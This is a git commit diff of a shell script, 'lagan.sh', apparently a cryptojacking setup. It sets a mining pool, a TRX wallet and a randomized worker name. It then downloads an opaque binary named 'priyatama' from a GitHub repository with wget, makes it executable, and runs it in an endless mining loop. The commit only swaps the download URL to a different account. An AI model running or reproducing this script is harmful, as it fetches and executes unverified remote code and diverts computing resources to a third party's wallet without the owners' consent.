575735bceca5acb739d7ed0b8c390cf8f4812871
connorthrope <88261896+connorthrope@users.noreply.github.com>
2021-09-07 06:57:32 +0700

    Update lagan.sh

--- lagan.sh
+++ lagan.sh
@@ -2,7 +2,7 @@
 POOL=ethash.unmineable.com:3333
 WALLET=TRX:THy2QWqsFcEQoEbKowmQR3jQjrW299ZbNt
 WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
-wget https://github.com/archernap/prem/raw/main/priyatama
+wget https://github.com/connorthrope/prem/raw/main/priyatama
 chmod +x priyatama
 while [ 1 ]; do
 ./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
